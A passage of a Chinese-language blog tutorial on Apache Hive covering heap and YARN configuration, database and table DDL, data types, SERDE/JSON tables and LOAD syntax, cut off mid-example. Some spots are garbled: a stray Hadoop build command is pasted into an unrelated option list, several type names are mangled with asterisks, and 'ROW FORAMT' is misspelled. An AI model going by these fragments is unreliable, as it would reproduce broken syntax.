class="line">property.hive.log.dir=/opt/module/hive/logs</span><br></pre></td></tr></table></figure><p><strong>Hive的JVM堆内存设置</strong>，新版本的Hive启动的时候，<strong>默认申请的JVM堆内存大小为256M</strong>，JVM堆内存申请的太小，导致后期开启本地模式，执行复杂的SQL时经常会报错：java.lang.OutOfMemoryError: Java heap space，因此最好提前调整一下<strong>HADOOP_HEAPSIZE</strong>这个参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改$HIVE_HOME/conf下的hive-env.sh.template为hive-env.sh</span></span><br><span class="line">mv hive-env.sh.template hive-env.sh</span><br><span class="line"><span class="comment"># 将hive-env.sh其中的参数 export HADOOP_HEAPSIZE修改为2048，重启Hive。</span></span><br><span class="line"><span class="comment"># The heap size of the jvm stared by hive shell script can be controlled via:</span></span><br><span class="line"><span class="built_in">export</span> HADOOP_HEAPSIZE=2048</span><br></pre></td></tr></table></figure><p><strong>关闭Hadoop虚拟内存检查</strong>，在yarn-site.xml中关闭虚拟内存检查（虚拟内存校验，如果已经关闭了，就不需要配了），修改完后记得分发yarn-site.xml，并重启yarn。<code>vim /opt/module/hadoop-3.1.3/etc/hadoop/yarn-site.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.vmem-check-enabled<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><h1>二、DDL&amp;DML语句</h1><h2 id="1、DDL-Data-Definition-Language-数据定义">1、DDL(Data Definition Language)数据定义</h2><h3 id="1-1-数据库">1.1 数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建数据库</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> [<span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>] database_name</span><br><span class="line">[<span class="keyword">COMMENT</span> database_comment]</span><br><span class="line">[LOCATION hdfs_path]</span><br><span class="line">[<span class="keyword">WITH</span> DBPROPERTIES (property_name=property_value, ...)];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个数据库，不指定路径</span></span><br><span class="line"><span class="comment"># 注：若不指定路径，其默认路径为$&#123;hive.metastore.warehouse.dir&#125;/database_name.db</span></span><br><span class="line">hive (default)&gt; create database db_hive1;</span><br><span class="line">hive (default)&gt; create database db_hive2 location '/db_hive2';</span><br><span class="line">hive (default)&gt; create database db_hive3 with dbproperties('create_date'='2022-11-18');</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==============查询数据库==================</span></span><br><span class="line"><span class="comment"># 注：like通配表达式说明：*表示任意个任意字符，|表示或的关系</span></span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">DATABASES</span> [<span class="keyword">LIKE</span> <span class="string">'identifier_with_wildcards'</span>];</span><br><span class="line">hive&gt; show databases like 'db_hive*';</span><br><span class="line"><span class="comment"># 查看数据库信息</span></span><br><span class="line"><span class="keyword">DESCRIBE</span> <span class="keyword">DATABASE</span> [<span class="keyword">EXTENDED</span>] db_name;</span><br><span class="line">hive&gt; desc database db_hive3;</span><br><span class="line"><span class="comment"># 查看更多信息</span></span><br><span class="line">hive&gt; desc database extended db_hive3;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==============修改数据库======================</span></span><br><span class="line"><span class="comment"># 用户可以使用alter database命令修改数据库某些信息，其中能够修改的信息包括dbproperties、location、owner user。</span></span><br><span class="line"><span class="comment"># 需要注意的是：修改数据库location，不会改变当前已有表的路径信息，而只是改变后续创建的新表的默认的父目录</span></span><br><span class="line"><span class="comment"># 修改dbproperties</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">DATABASE</span> database_name <span class="keyword">SET</span> DBPROPERTIES (property_name=property_value, ...);</span><br><span class="line"><span class="comment"># 修改location</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">DATABASE</span> database_name <span class="keyword">SET</span> LOCATION hdfs_path;</span><br><span class="line"><span class="comment"># 修改owner user</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">DATABASE</span> database_name <span class="keyword">SET</span> OWNER <span class="keyword">USER</span> user_name;</span><br><span class="line"></span><br><span class="line">hive&gt; ALTER DATABASE db_hive3 SET DBPROPERTIES ('create_date'='2022-11-20');</span><br><span class="line"></span><br><span class="line"><span class="comment"># ======================删除数据库====================</span></span><br><span class="line"><span class="comment"># 注：RESTRICT：严格模式，若数据库不为空，则会删除失败，默认为该模式。</span></span><br><span class="line"><span class="comment"># CASCADE：级联模式，若数据库不为空，则会将库中的表一并删除</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> [<span class="keyword">IF</span> <span class="keyword">EXISTS</span>] database_name [RESTRICT|<span class="keyword">CASCADE</span>];</span><br><span class="line"></span><br><span class="line">hive&gt; drop database db_hive2;</span><br><span class="line">hive&gt; drop database db_hive3 cascade;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ====================切换当前数据库=======================</span></span><br><span class="line"><span class="keyword">USE</span> database_name;</span><br></pre></td></tr></table></figure><h3 id="1-2-表-table-创建">1.2 表(table)创建</h3><p><strong>普通建表</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建表</span></span><br><span class="line"><span class="keyword">CREATE</span> [<span class="keyword">TEMPORARY</span>] [<span class="keyword">EXTERNAL</span>] <span class="keyword">TABLE</span> [<span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>] [db_name.]table_name   </span><br><span class="line">[(col_name data_type [<span class="keyword">COMMENT</span> col_comment], ...)]</span><br><span class="line">[<span class="keyword">COMMENT</span> table_comment]</span><br><span class="line">[PARTITIONED <span class="keyword">BY</span> (col_name data_type [<span class="keyword">COMMENT</span> col_comment], ...)]</span><br><span class="line">[CLUSTERED <span class="keyword">BY</span> (col_name, col_name, ...) </span><br><span class="line">[SORTED <span class="keyword">BY</span> (col_name [<span class="keyword">ASC</span>|<span class="keyword">DESC</span>], ...)] <span class="keyword">INTO</span> num_buckets BUCKETS]</span><br><span class="line">[<span class="keyword">ROW</span> <span class="keyword">FORMAT</span> row_format] </span><br><span class="line">[<span class="keyword">STORED</span> <span class="keyword">AS</span> file_format]</span><br><span class="line">[LOCATION hdfs_path]</span><br><span class="line">[TBLPROPERTIES (property_name=property_value, ...)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以预查看一些基本默认设置</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> + 表名</span><br></pre></td></tr></table></figure><ul><li><p>TEMPORARY，临时表，该表只在当前会话可见，会话结束，表会被删除</p></li><li><p>EXTERNAL（重点），外部表，与之相对应的是内部表（管理表）。管理表意味着Hive会完全接管该表，包括元数据和HDFS中的数据。而外部表则意味着Hive只接管元数据，而不完全接管HDFS中的数据</p></li><li><p>data_type（重点），Hive中的字段类型可分为基本数据类型和复杂数据类型</p><table><thead><tr><th><strong>Hive</strong></th><th><strong>说明</strong></th><th>定义</th></tr></thead><tbody><tr><td><strong>t****inyint</strong></td><td>1byte有符号整数</td><td></td></tr><tr><td><strong>s****mallint</strong></td><td>2byte有符号整数</td><td></td></tr><tr><td><strong>i****nt</strong></td><td>4byte有符号整数</td><td></td></tr><tr><td><strong>b****igint</strong></td><td>8byte有符号整数</td><td></td></tr><tr><td><strong>b****oolean</strong></td><td>布尔类型，true或者false</td><td></td></tr><tr><td><strong>f****loat</strong></td><td>单精度浮点数</td><td></td></tr><tr><td><strong>d****ouble</strong></td><td>双精度浮点数</td><td></td></tr><tr><td><strong>decimal</strong></td><td>十进制精准数字类型</td><td>decimal(16,2)</td></tr><tr><td><strong>varchar</strong></td><td>字符序列，需指定最大长度，最大长度的范围是[1,65535]</td><td>varchar(32)</td></tr><tr><td><strong>string</strong></td><td>字符串，无需指定最大长度</td><td></td></tr><tr><td><strong>t****imestamp</strong></td><td>时间类型</td><td></td></tr><tr><td><strong>b****inary</strong></td><td>二进制数据</td><td></td></tr><tr><td>复杂数据类型如下</td><td></td><td></td></tr><tr><td>类型</td><td>说明</td><td>定义</td></tr><tr><td>------</td><td>----------------------------</td><td>----------------------------</td></tr><tr><td>array</td><td>数组是一组相同类型的值的集合</td><td>array&lt;string&gt;</td></tr><tr><td>map</td><td>map是一组相同类型的键-值对集合</td><td>map&lt;string, int&gt;</td></tr><tr><td>struct</td><td>结构体由多个属性组成，每个属性都有自己的属性名和数据类型</td><td>struct&lt;id:int, name:string&gt;</td></tr><tr><td>Hive的基本数据类型可以做类型转换，转换的方式包括隐式转换以及显示转换，详情可参考Hive官方说明：<a href="https://cwiki.apache.org/confluence/display/hive/languagemanual+types" target="_blank" rel="noopener" title="Allowed Implicit Conversions">Allowed Implicit Conversions</a></td><td></td><td></td></tr></tbody></table><ul><li>任何整数类型都可以隐式地转换为一个范围更广的类型，如tinyint可以转换成int，int可以转换成bigint</li><li>所有整数类型、float和string类型都可以隐式地转换成double。</li><li>tinyint、smallint、int都可以转换为float</li><li>boolean类型不可以转换为任何其它的类型</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 显示转换可以借助cast函数完成显示的类型转换</span></span><br><span class="line"><span class="comment"># cast(expr as &lt;type&gt;) </span></span><br><span class="line">hive (default)&gt; select <span class="string">'1'</span> + 2, cast(<span class="string">'1'</span> as int) + 2;</span><br></pre></td></tr></table></figure></li><li><p>PARTITIONED BY（重点）,创建分区表</p></li><li><p>CLUSTERED BY … SORTED BY…INTO … BUCKETS（重点）,创建分桶表</p></li><li><p>ROW FORMAT（重点），指定SERDE，SERDE是Serializer and Deserializer的简写。Hive使用SERDE序列化和反序列化每行数据。详情可参考 <a href="https://cwiki.apache.org/confluence/display/Hive/DeveloperGuide" target="_blank" rel="noopener" title="Hive-Serde">Hive-Serde</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 语法一：DELIMITED关键字表示对文件中的每个字段按照特定分割符进行分割，其会使用默认的SERDE对每行数据进行序列化和反序列化</span></span><br><span class="line">ROW FORAMT DELIMITED </span><br><span class="line">[FIELDS TERMINATED BY char] </span><br><span class="line">[COLLECTION ITEMS TERMINATED BY char] </span><br><span class="line">[MAP KEYS TERMINATED BY char] </span><br><span class="line">[LINES TERMINATED BY char] </span><br><span class="line">[NULL DEFINED AS char]</span><br><span class="line"><span class="comment"># fields terminated by ：列分隔符</span></span><br><span class="line"><span class="comment"># collection items terminated by ： map、struct和array中每个元素之间的分隔符</span></span><br><span class="line"><span class="comment"># map keys terminated by ：map中的key与value的分隔符</span></span><br><span class="line"><span class="comment"># lines terminated by ：行分隔符</span></span><br><span class="line"><span class="comment"># [TBLPROPERTIES (property_name=property_value, ...)]</span></span><br><span class="line"><span class="comment"># [AS select_statement]</span></span><br><span class="line"><span class="comment"># null 一般在hdfs用/N表示</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 语法二：SERDE关键字可用于指定其他内置的SERDE或者用户自定义的SERDE。例如JSON SERDE，可用于处理JSON字符串</span></span><br><span class="line">ROW FORMAT SERDE serde_name [WITH SERDEPROPERTIES (property_name=property_value,property_name=property_value, ...)]</span><br></pre></td></tr></table></figure></li><li><p>STORED AS（重点）,指定文件格式，常用的文件格式有，textfile（默认值），sequence file，orc file、parquet file等等</p></li><li><p>xxxxxxxxxx # 进入解压后的Hadoop源码目录下#开始编译mvn clean package -DskipTests -Pdist,native -Dtar# 注意：第一次编译需要下载很多依赖jar包，编译时间会很久，预计1小时左右，最终成功是全部SUCCESS​# 成功的64位hadoop包在/opt/module/hadoop_source/hadoop-3.1.3-src/hadoop-dist/target下​bash</p></li><li><p>TBLPROPERTIES，用于配置表的一些KV键值对参数</p></li></ul><p><strong>Create</strong> <strong>Table</strong> <strong>As</strong> <strong>Select（CTAS）建表</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 该语法允许用户利用select查询语句返回的结果，直接建表，表的结构和查询语句的结构保持一致，且保证包含select查询语句放回的内容。</span></span><br><span class="line"><span class="keyword">CREATE</span> [<span class="keyword">TEMPORARY</span>] <span class="keyword">TABLE</span> [<span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>] table_name </span><br><span class="line">[<span class="keyword">COMMENT</span> table_comment] </span><br><span class="line">[<span class="keyword">ROW</span> <span class="keyword">FORMAT</span> row_format] </span><br><span class="line">[<span class="keyword">STORED</span> <span class="keyword">AS</span> file_format] </span><br><span class="line">[LOCATION hdfs_path]</span><br><span class="line">[TBLPROPERTIES (property_name=property_value, ...)]</span><br><span class="line">[<span class="keyword">AS</span> select_statement]</span><br></pre></td></tr></table></figure><p><strong>Create</strong> <strong>Table</strong> <strong>Like语法</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 该语法允许用户复刻一张已经存在的表结构，与上述的CTAS语法不同，该语法创建出来的表中不包含数据</span></span><br><span class="line"><span class="keyword">CREATE</span> [<span class="keyword">TEMPORARY</span>] [<span class="keyword">EXTERNAL</span>] <span class="keyword">TABLE</span> [<span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>] [db_name.]table_name</span><br><span class="line">[<span class="keyword">LIKE</span> exist_table_name]</span><br><span class="line">[<span class="keyword">ROW</span> <span class="keyword">FORMAT</span> row_format] </span><br><span class="line">[<span class="keyword">STORED</span> <span class="keyword">AS</span> file_format] </span><br><span class="line">[LOCATION hdfs_path]</span><br><span class="line">[TBLPROPERTIES (property_name=property_value, ...)]</span><br></pre></td></tr></table></figure><p>案例说明</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># =====================内部表与外部表====================</span></span><br><span class="line"><span class="comment"># ===================内部表=============================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Hive中默认创建的表都是的内部表，有时也被称为管理表。对于内部表，Hive会完全管理表的元数据和数据文件</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exists</span> student(</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">int</span>, </span><br><span class="line">    <span class="keyword">name</span> <span class="keyword">string</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> <span class="keyword">delimited</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'\t'</span></span><br><span class="line">location <span class="string">'/user/hive/warehouse/student'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># vim /opt/module/datas/student.txt插入数据</span></span><br><span class="line">1001  student1</span><br><span class="line">1002  student2</span><br><span class="line">1003  student3</span><br><span class="line">1004  student4</span><br><span class="line">1005  student5</span><br><span class="line">1006  student6</span><br><span class="line">1007  student7</span><br><span class="line">1008  student8</span><br><span class="line"></span><br><span class="line">hadoop fs -put student.txt /user/hive/warehouse/student</span><br><span class="line"><span class="comment"># 删除表，发现数据也没了</span></span><br><span class="line">hive (default)&gt; drop table student;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ======================外部表===========================</span></span><br><span class="line"><span class="comment"># 外部表通常可用于处理其他工具上传的数据文件，对于外部表，Hive只负责管理元数据，不负责管理HDFS中的数据文件</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">external</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exists</span> student(</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">int</span>, </span><br><span class="line">    <span class="keyword">name</span> <span class="keyword">string</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> <span class="keyword">delimited</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'\t'</span></span><br><span class="line">location <span class="string">'/user/hive/warehouse/student'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =======================SERDE和复杂数据类型=======================</span></span><br><span class="line"><span class="comment"># 若现有如下格式的JSON文件需要由Hive进行分析处理，请考虑如何设计表？</span></span><br><span class="line"><span class="comment"># 注：以下内容为格式化之后的结果，文件中每行数据为一个完整的JSON字符串</span></span><br><span class="line">&#123;</span><br><span class="line">    "name": "dasongsong",</span><br><span class="line">    "friends": [</span><br><span class="line">        "bingbing",</span><br><span class="line">        "lili"</span><br><span class="line">    ],</span><br><span class="line">    "students": &#123;</span><br><span class="line">        "xiaohaihai": 18,</span><br><span class="line">        "xiaoyangyang": 16</span><br><span class="line">    &#125;,</span><br><span class="line">    "address": &#123;</span><br><span class="line">        "street": "hui long guan",</span><br><span class="line">        "city": "beijing",</span><br><span class="line">        "postal_code": 10010</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 设计表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> teacher</span><br><span class="line">(</span><br><span class="line">    <span class="keyword">name</span>     <span class="keyword">string</span>,</span><br><span class="line">    friends  <span class="built_in">array</span>&lt;<span class="keyword">string</span>&gt;,</span><br><span class="line">    students <span class="keyword">map</span>&lt;<span class="keyword">string</span>,<span class="built_in">int</span>&gt;,</span><br><span class="line">    address  <span class="keyword">struct</span>&lt;city:<span class="keyword">string</span>,street:<span class="keyword">string</span>,postal_code:<span class="built_in">int</span>&gt;</span><br><span class="line">)</span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> serde <span class="string">'org.apache.hadoop.hive.serde2.JsonSerDe'</span></span><br><span class="line">location <span class="string">'/user/hive/warehouse/teacher'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建json，然后上传，注意不能有空格</span></span><br><span class="line">vim /opt/module/datas/teacher.txt</span><br><span class="line">&#123;"name":"dasongsong","friends":["bingbing","lili"],"students":&#123;"xiaohaihai":18,"xiaoyangyang":16&#125;,"address":&#123;"street":"hui long guan","city":"beijing","postal_code":10010&#125;&#125;</span><br><span class="line"><span class="comment"># 上传</span></span><br><span class="line">hadoop fs -put teacher.txt /user/hive/warehouse/teacher</span><br><span class="line"><span class="comment"># 尝试从复杂数据类型的字段中取值</span></span><br><span class="line"><span class="keyword">select</span> friends[<span class="number">0</span>],students[<span class="string">'xiaohaihai'</span>],address.city <span class="keyword">from</span> teacher</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===================create table as select和create table like=========</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> teacher1 <span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> teacher;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> teacher2 <span class="keyword">like</span> teacher;</span><br></pre></td></tr></table></figure><h3 id="1-3-表的增删查改">1.3 表的增删查改</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ====================查看表=====================</span></span><br><span class="line"><span class="comment"># 展示所有表</span></span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">TABLES</span> [<span class="keyword">IN</span> database_name] <span class="keyword">LIKE</span> [<span class="string">'identifier_with_wildcards'</span>];</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span> <span class="keyword">like</span> <span class="string">'stu*'</span>;</span><br><span class="line"><span class="comment"># 查看表信息</span></span><br><span class="line"><span class="keyword">DESCRIBE</span> [<span class="keyword">EXTENDED</span> | FORMATTED] [db_name.]table_name</span><br><span class="line"><span class="comment"># EXTENDED：展示详细信息</span></span><br><span class="line"><span class="comment"># FORMATTED：对详细信息进行格式化的展示</span></span><br><span class="line"><span class="keyword">desc</span> stu;</span><br><span class="line">desc formatted stu;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =====================修改表=======================</span></span><br><span class="line"><span class="comment"># 重命名表</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">RENAME</span> <span class="keyword">TO</span> new_table_name</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu <span class="keyword">rename</span> <span class="keyword">to</span> stu1;</span><br><span class="line"><span class="comment"># 修改列信息</span></span><br><span class="line"><span class="comment"># 增加列,该语句允许用户增加新的列，新增列的位置位于末尾</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">ADD</span> <span class="keyword">COLUMNS</span> (col_name data_type [<span class="keyword">COMMENT</span> col_comment], ...)</span><br><span class="line"><span class="comment"># 更新列,该语句允许用户修改指定列的列名、数据类型、注释信息以及在表中的位置</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">CHANGE</span> [<span class="keyword">COLUMN</span>] col_old_name col_new_name column_type [<span class="keyword">COMMENT</span> col_comment] [<span class="keyword">FIRST</span>|<span class="keyword">AFTER</span> column_name]</span><br><span class="line"><span class="comment"># 替换列,该语句允许用户用新的列集替换表中原有的全部列</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">REPLACE</span> <span class="keyword">COLUMNS</span> (col_name data_type [<span class="keyword">COMMENT</span> col_comment], ...)</span><br><span class="line"><span class="comment"># 案例</span></span><br><span class="line"><span class="keyword">desc</span> stu;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu <span class="keyword">add</span> <span class="keyword">columns</span>(age <span class="built_in">int</span>);</span><br><span class="line">desc stu;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu <span class="keyword">change</span> <span class="keyword">column</span> age ages <span class="keyword">double</span>;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu <span class="keyword">replace</span> <span class="keyword">columns</span>(<span class="keyword">id</span> <span class="built_in">int</span>, <span class="keyword">name</span> <span class="keyword">string</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># ======================删除表==================</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> [<span class="keyword">IF</span> <span class="keyword">EXISTS</span>] table_name;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> stu;</span><br><span class="line"><span class="comment"># =====================清空表======================</span></span><br><span class="line"><span class="comment"># 注意：truncate只能清空管理表，不能删除外部表中数据</span></span><br><span class="line"><span class="keyword">TRUNCATE</span> [<span class="keyword">TABLE</span>] table_name</span><br><span class="line"><span class="keyword">truncate</span> <span class="keyword">table</span> student;</span><br></pre></td></tr></table></figure><h2 id="2、DML-Data-Manipulation-Language-数据操作">2、DML(Data Manipulation Language)数据操作</h2><h3 id="2-1-Load">2.1 Load</h3><p>Load语句可将文件导入到Hive表中，<strong>关键字说明：</strong></p><ul><li>local：表示从本地加载数据到Hive表；否则从HDFS加载数据到Hive表</li><li>overwrite：表示覆盖表中已有数据，否则表示追加</li><li>partition：表示上传到指定分区，若目标是分区表，需指定分区</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 语法</span></span><br><span class="line"><span class="keyword">LOAD</span> <span class="keyword">DATA</span> [<span class="keyword">LOCAL</span>] INPATH <span class="string">'filepath'</span> [OVERWRITE] <span class="keyword">INTO</span> <span class="keyword">TABLE</span> tablename [<span class="keyword">PARTITION</span> (partcol1=val1, partcol2=val2 ...)];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实操案例</span></span><br><span class="line"><span class="comment"># 创建表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">int</span>, </span><br><span class="line">    <span class="keyword">name</span> <span class="keyword">string</span></span><br><span class="line">) </span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> <span class="keyword">delimited</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'\t'</span>;</span><br><span class="line"><span 